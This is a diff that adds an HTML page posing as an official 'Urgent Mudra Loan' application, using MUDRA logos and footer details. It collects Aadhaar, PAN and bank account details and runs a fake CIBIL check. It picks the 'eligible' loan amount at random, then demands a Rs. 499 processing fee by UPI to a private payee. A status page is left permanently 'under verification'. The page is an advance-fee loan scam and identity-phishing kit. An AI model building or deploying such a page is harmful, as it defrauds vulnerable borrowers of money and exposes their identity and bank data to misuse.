@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Urgent Mudra Loan</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+    body {
+      background: #f5f7fa;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      max-width: 500px;
+      background: white;
+      margin: auto;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+    }
+    h2 {
+      text-align: center;
+      color: #1e88e5;
+      margin-bottom: 25px;
+      font-weight: 700;
+    }
+    h3 {
+      text-align: center;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    label {
+      font-weight: 600;
+      margin-top: 15px;
+      display: block;
+    }
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin-top: 6px;
+      font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+    input[type=range] {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 100%;
+      height: 8px;
+      background: #e0e0e0;
+      border-radius: 5px;
+      margin-top: 20px;
+    }
+    input[type=range]::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: #1e88e5;
+      border: 2px solid white;
+      box-shadow: 0 0 3px rgba(0,0,0,0.4);
+      cursor: pointer;
+    }
+    .step {
+      display: none;
+    }
+    .step.active {
+      display: block;
+      animation: fade 0.3s ease-in-out;
+    }
+    @keyframes fade {
+      from {opacity: 0;}
+      to {opacity: 1;}
+    }
+    .button-group {
+      text-align: center;
+      margin-top: 25px;
+    }
+    button {
+      padding: 12px 25px;
+      margin: 8px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      background: #1e88e5;
+      color: #fff;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #1565c0;
+    }
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-top: 4px;
+    }
+    .center {
+      text-align: center;
+    }
+    .banner {
+      background: #e3f2fd;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      border-left: 5px solid #1e88e5;
+      text-align: center;
+    }
+    .banner strong {
+      display: block;
+      font-size: 22px;
+      color: #1565c0;
+      margin-top: 5px;
+    }
+    .value-display {
+      text-align: center;
+      font-size: 16px;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+    .card-row {
+      display: flex;
+      gap: 15px;
+      margin-top: 20px;
+      flex-wrap: wrap;
+      justify-content: space-between;
+    }
+    .card {
+      flex: 1 1 45%;
+      background: #f1f8ff;
+      border-radius: 10px;
+      padding: 15px;
+      text-align: center;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+    }
+    .card h4 {
+      margin: 0;
+      color: #1e88e5;
+    }
+.verifying-text {
+  text-align: center;
+  font-style: italic;
+  color: #666;
+  animation: blinkFade 2s ease-in-out infinite;
+}
+
+@keyframes blinkFade {
+  0% { opacity: 1; }
+  50% { opacity: 0.4; }
+  100% { opacity: 1; }
+}
+
+    .card p {
+      margin-top: 8px;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    @media (max-width: 500px) {
+      .card {
+        flex: 1 1 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+<!-- Logo Section -->
+<div style="text-align:center; margin-bottom: 10px;">
+  <img src="https://mudra.org.in/images/logo.png" alt="Mudra Logo" height="60">
+<img src="https://mudra.org.in/images/azadi-logo.png" alt="Mudra Logo" height="60">
+
+</div>
+    <h2>Urgent Mudra Loan</h2>
+
+
+    <!-- Step 1 -->
+    <div class="step active" id="step1">
+      <h3>Step 1: Personal Details</h3>
+      <label>Aadhar Card Number:</label>
+      <input type="text" id="aadhar" maxlength="12" oninput="this.value = this.value.replace(/[^0-9]/g, ''); limitLength(this, 12)">
+
+      <div id="aadharError" class="error"></div>
+
+      <label>PAN Card Number:</label>
+      <input type="text" id="pan" maxlength="10" oninput="this.value = this.value.toUpperCase()">
+      <div id="panError" class="error"></div>
+
+      <label>Qualification:</label>
+      <select id="qualification">
+        <option>Illeterate</option>
+        <option>Below 8th</option>
+        <option>10th</option>
+        <option>12th</option>
+        <option selected>Graduate</option>
+        <option>Post Graduate</option>
+      </select>
+
+      <label>Monthly Income:</label>
+      <select id="income">
+        <option>Below Rs. 50000</option>
+        <option>Above Rs. 50000</option>
+      </select>
+
+      <label>Occupation:</label>
+      <select id="occupation">
+        <option selected>Self Employed</option>
+        <option>Government Job</option>
+        <option>Private Job</option>
+      </select>
+
+      <div class="button-group">
+        <button onclick="nextStep1()">Next</button>
+      </div>
+<!-- ...ei line holo apnar last step7 er pore -->
+
+<!-- ✅ CHECK STATUS BUTTON -->
+<div style="text-align:center; margin-top: 30px;">
+  <button onclick="showStatusCheck()" style="background:#43a047;">Check Application Status</button>
+</div>
+
+    </div>
+
+    <!-- Step 2 -->
+    <div class="step" id="step2">
+      <h3>Hold on! Checking your CIBIL SCORE</h3>
+      <div class="center">
+        <img src="https://i.gifer.com/ZZ5H.gif" width="70" />
+        <p><span id="cibilTimer">10</span> seconds remaining</p>
+      </div>
+      <div class="button-group">
+        <button onclick="prevStep(2)">Back</button>
+      </div>
+    </div>
+    <!-- Step 3 -->
+    <div class="step" id="step3">
+      <div class="banner">
+        🎉 Congratulations! You are eligible for a loan!
+        <strong>Eligible up to: Rs. <span id="eligibleAmount">0</span></strong>
+      </div>
+      <h3>Select Loan Amount</h3>
+      <input type="range" id="loanSlider" min="10000" step="10000" oninput="updateLoan(this.value)">
+      <div class="value-display">Selected: Rs. <span id="loanDisplay">10000</span></div>
+
+      <div class="button-group">
+        <button onclick="prevStep(3)">Back</button>
+        <button onclick="nextStep(3)">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 4 -->
+    <div class="step" id="step4">
+      <h3>Step 4: EMI Details</h3>
+      <label>EMI Tenure:</label>
+      <select id="emiTenure" onchange="calculateEMI()">
+        <option value="3">3 Months</option>
+        <option value="6">6 Months</option>
+        <option value="12">12 Months</option>
+        <option value="24">24 Months</option>
+        <option value="36">36 Months</option>
+      </select>
+
+      <div class="card-row">
+        <div class="card">
+          <h4>Loan Amount</h4>
+          <p>Rs. <span id="loanFinal">0</span></p>
+        </div>
+        <div class="card">
+          <h4>Total Payable</h4>
+          <p>Rs. <span id="totalPayable">0</span></p>
+        </div>
+        <div class="card">
+          <h4>Monthly EMI</h4>
+          <p>Rs. <span id="emiAmount">0</span></p>
+        </div>
+      </div>
+
+      <div class="button-group">
+        <button onclick="prevStep(4)">Back</button>
+        <button onclick="nextStep(4)">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 5: Bank Details -->
+    <div class="step" id="step5">
+      <h3>Step 5: Enter Bank Details</h3>
+      <label>Bank Account Number:</label>
+      <input type="text" id="bankAccount" />
+      <div class="error" id="bankAccountError"></div>
+
+      <label>IFSC Code:</label>
+      <input type="text" id="ifscCode" />
+      <div class="error" id="ifscError"></div>
+
+      <label>Account Holder Name:</label>
+      <input type="text" id="accountHolder" />
+      <div class="error" id="accountHolderError"></div>
+
+      <div class="button-group">
+        <button onclick="prevStep(5)">Back</button>
+        <button onclick="validateBankDetails()">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 6: QR & UPI -->
+    <div class="step" id="step6">
+      <h3>Final Step: Service Charge Payment</h3>
+      <div class="center">
+        <p>Please pay <strong>2% of loan amount</strong> as processing fee.</p>
+        <h2 style="color:#e53935;">Payable: Rs. <span id="serviceCharge">0</span></h2>
+        <img src="https://api.qrserver.com/v1/create-qr-code/?data=upi://pay?pa=onecliq@ptyes" alt="QR Code" width="200" />
+        <p><strong>UPI ID:</strong> onecliq@ptyes</p>
+      </div>
+
+      <div class="button-group">
+        <button onclick="prevStep(6)">Back</button>
+        <button onclick="nextStep(6)">Next</button>
+      </div>
+    </div>
+
+    <!-- Step 7: Final Message -->
+    <div class="step" id="step7">
+      <h3 style="color: #43a047;">Your application is under verification</h3>
+      <div class="center">
+        <img src="https://cdn-icons-png.flaticon.com/512/6334/6334645.png" width="100" alt="verifying" />
+        <p style="font-size: 18px; margin-top: 10px;">Amount will be credited to your bank account within <strong>3–4 hours</strong>.</p>
+      </div>
+      <div class="button-group">
+        <button onclick="prevStep(7)">Back</button>
+        <button onclick="location.reload()">Submit</button>
+      </div>
+    </div>
+
+<!-- Step 8: Status Check Form -->
+<div class="step" id="statusCheck">
+  <h3>🔍 Check Your Loan Application</h3>
+  <label>Enter Aadhar Number:</label>
+  <input 
+  type="text" 
+  id="statusAadhar" 
+  maxlength="12" 
+  oninput="this.value=this.value.replace(/\D/g,''); limitLength(this, 12);" 
+  placeholder="Enter 12-digit Aadhar"
+/>
+
+  <div id="statusError" class="error"></div>
+
+  <div class="button-group">
+    <button onclick="checkStatus()">Check Status</button>
+    <button onclick="hideStatusCheck()">Back</button>
+  </div>
+</div>
+
+<!-- Step 9: Status Roadmap -->
+<div class="step" id="statusResult">
+  <h3 style="text-align:center; color:#1e88e5;">🛣️ Application Status</h3>
+  <div class="banner">
+    Your application is under verification
+  </div>
+<p class="verifying-text">Please wait while our system is verifying your credentials...</p>
+
+  <div style="margin: 40px 0;">
+    <div style="display: flex; align-items: center; justify-content: space-between;">
+      <div style="text-align:center; flex:1;">
+        <div style="width:30px; height:30px; background:#4caf50; color:white; border-radius:50%; line-height:30px; margin:auto;">1</div>
+        <p style="margin-top:10px; font-weight:bold;">Received</p>
+      </div>
+
+      <div style="flex:1; height:2px; background:#ccc;"></div>
+
+      <div style="text-align:center; flex:1;">
+        <div style="width:30px; height:30px; background:#e53935; color:white; border-radius:50%; line-height:30px; margin:auto;">2</div>
+        <p style="margin-top:10px; font-weight:bold;">Under Verification</p>
+      </div>
+
+      <div style="flex:1; height:2px; background:#ccc;"></div>
+
+      <div style="text-align:center; flex:1; opacity:0.4;">
+        <div style="width:30px; height:30px; background:#ccc; color:white; border-radius:50%; line-height:30px; margin:auto;">3</div>
+        <p style="margin-top:10px; font-weight:bold;">Bank Verified</p>
+      </div>
+
+      <div style="flex:1; height:2px; background:#ccc;"></div>
+
+      <div style="text-align:center; flex:1; opacity:0.4;">
+        <div style="width:30px; height:30px; background:#ccc; color:white; border-radius:50%; line-height:30px; margin:auto;">4</div>
+        <p style="margin-top:10px; font-weight:bold;">Amount Credited</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="button-group">
+    <button onclick="hideStatusResult()">Back</button>
+    <button onclick="location.reload()">Home</button>
+  </div>
+</div>
+</div>
+<!-- Step 7: Final Message -->
+<div class="step" id="step7">...</div>
+
+<!-- ✅ Paste these 2 below -->
+<div class="step" id="statusCheck">...</div>
+<div class="step" id="statusResult">...</div>
+
+</div> <!-- container -->
+
+  </div>
+
+  <script>
+    let eligibleAmt = 0, selectedLoan = 10000;
+
+    function nextStep1() {
+      const aadhar = document.getElementById("aadhar").value.trim();
+      const pan = document.getElementById("pan").value.trim().toUpperCase();
+      let aadharError = "", panError = "";
+
+      if (!/^\d{12}$/.test(aadhar)) {
+        aadharError = "Aadhar must be 12 digits.";
+      }
+
+      if (!/^[A-Z0-9]{10}$/.test(pan)) {
+        panError = "PAN must be 10 alphanumeric characters.";
+      }
+
+      document.getElementById("aadharError").innerText = aadharError;
+      document.getElementById("panError").innerText = panError;
+
+      if (!aadharError && !panError) {
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+        startCIBIL();
+      }
+    }
+
+    function nextStep(n) {
+  document.getElementById('step' + n).classList.remove('active');
+  document.getElementById('step' + (n + 1)).classList.add('active');
+
+  // STEP 3: Eligible Loan Amount
+  if (n + 1 === 3) {
+    const options = [50000, 60000, 80000, 100000, 200000, 500000, 1000000];
+    eligibleAmt = options[Math.floor(Math.random() * options.length)];
+    document.getElementById("eligibleAmount").innerText = eligibleAmt.toLocaleString();
+    let slider = document.getElementById("loanSlider");
+    slider.max = eligibleAmt;
+    slider.value = eligibleAmt;
+    updateLoan(eligibleAmt);
+  }
+
+  // STEP 4: EMI Calculation
+  if (n + 1 === 4) {
+    document.getElementById("loanFinal").innerText = selectedLoan.toLocaleString();
+    calculateEMI();
+  }
+
+  // STEP 6: Fixed Rs. 499 payment + UPI button + QR
+if (n + 1 === 6) {
+  const charge = 499;
+  document.getElementById("serviceCharge").innerText = charge.toLocaleString();
+
+  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(
+    `upi://pay?pa=onecliq@ptyes&pn=Urgent%20Loan&am=${charge}&cu=INR`
+  )}`;
+  document.querySelector('#step6 img').src = qrUrl;
+
+  // Remove previous button if exists
+  const oldBtn = document.getElementById("upiDirectButton");
+  if (oldBtn) oldBtn.remove();
+
+  // Create direct UPI button
+  const deeplink = `upi://pay?pa=onecliq@ptyes&pn=Urgent%20Loan&am=${charge}&cu=INR`;
+  const btn = document.createElement("a");
+  btn.href = deeplink;
+  btn.id = "upiDirectButton";
+  btn.innerHTML = `<button style="margin-top: 15px; padding: 12px 25px; background: #4caf50; color: white; font-size: 16px; border: none; border-radius: 6px;">Pay via UPI App</button>`;
+  btn.style.textDecoration = "none";
+
+  document.querySelector("#step6 .center").appendChild(btn);
+
+  // Update message text
+  document.querySelector("#step6 p").innerHTML = `<strong>Pay loan processing fee including 18% GST.</strong>`;
+}
+
+}
+
+
+    function prevStep(n) {
+      document.getElementById('step' + n).classList.remove('active');
+      document.getElementById('step' + (n - 1)).classList.add('active');
+    }
+
+    function limitLength(input, max) {
+      if (input.value.length > max) input.value = input.value.slice(0, max);
+    }
+
+    function startCIBIL() {
+      let time = 10;
+      let timer = setInterval(() => {
+        document.getElementById("cibilTimer").innerText = time;
+        time--;
+        if (time < 0) {
+          clearInterval(timer);
+          nextStep(2);
+        }
+      }, 1000);
+    }
+
+    function updateLoan(val) {
+      selectedLoan = parseInt(val);
+      document.getElementById("loanDisplay").innerText = selectedLoan.toLocaleString();
+    }
+
+    function calculateEMI() {
+      let t = parseInt(document.getElementById("emiTenure").value);
+      let interest = selectedLoan * ((t * 2) / 100);
+      let total = selectedLoan + interest;
+      let emi = Math.round(total / t);
+
+      document.getElementById("totalPayable").innerText = Math.round(total).toLocaleString();
+      document.getElementById("emiAmount").innerText = emi.toLocaleString();
+    }
+
+    function validateBankDetails() {
+      let valid = true;
+      const bank = document.getElementById("bankAccount").value.trim();
+      const ifsc = document.getElementById("ifscCode").value.trim();
+      const holder = document.getElementById("accountHolder").value.trim();
+
+      document.getElementById("bankAccountError").innerText = bank ? "" : "Required";
+      document.getElementById("ifscError").innerText = ifsc ? "" : "Required";
+      document.getElementById("accountHolderError").innerText = holder ? "" : "Required";
+
+      if (!bank || !ifsc || !holder) valid = false;
+
+      if (valid) nextStep(5);
+    }
+  // ... all your existing code above ...
+
+  function showStatusCheck() {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById('statusCheck').classList.add('active');
+  }
+
+  function checkStatus() {
+    const aadhar = document.getElementById("statusAadhar").value.trim();
+    if (!/^\d{12}$/.test(aadhar)) {
+      document.getElementById("statusError").innerText = "Aadhar must be 12 digits.";
+    } else {
+      document.getElementById("statusError").innerText = "";
+      document.getElementById("statusCheck").classList.remove('active');
+      document.getElementById("statusResult").classList.add('active');
+    }
+  }
+
+  function hideStatusCheck() {
+    document.getElementById("statusCheck").classList.remove('active');
+    document.getElementById("step7").classList.add('active'); // go back to last step
+  }
+
+  function hideStatusResult() {
+    document.getElementById("statusResult").classList.remove('active');
+    document.getElementById("statusCheck").classList.add('active');
+  }
+  </script>
+<!-- Footer Info -->
+<div style="text-align:center; font-size: 13px; color: #777; margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd;">
+  <p><strong>CIN:</strong> U65100MH2015PLC274695</p>
+  <p><strong>Registered Office:</strong><br>
+  SWAVALAMBAN BHAVAN, C-11, G-BLOCK, BANDRA KURLA COMPLEX,<br>
+  BANDRA EAST, MUMBAI – 400 051</p>
+  <p><strong>Helpline No:</strong> 18003456195<br>
+     <strong>Email:</strong> help@mudra.org.in</p>
+</div>
+</body>
+</html>
